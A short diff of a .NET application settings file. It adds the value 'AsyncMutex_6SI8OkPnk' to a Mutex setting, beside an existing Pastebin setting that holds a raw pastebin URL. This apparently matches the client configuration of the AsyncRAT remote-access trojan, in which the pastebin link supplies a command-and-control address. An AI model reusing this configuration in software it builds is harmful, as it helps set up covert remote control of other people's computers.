@@ -12,7 +12,7 @@
       <Value Profile="(Default)">True</Value>
     </Setting>
     <Setting Name="Mutex" Type="System.String" Scope="User">
-      <Value Profile="(Default)" />
+      <Value Profile="(Default)">AsyncMutex_6SI8OkPnk</Value>
     </Setting>
     <Setting Name="Pastebin" Type="System.String" Scope="User">
       <Value Profile="(Default)">https://pastebin.com/raw/s14cUU5G</Value>
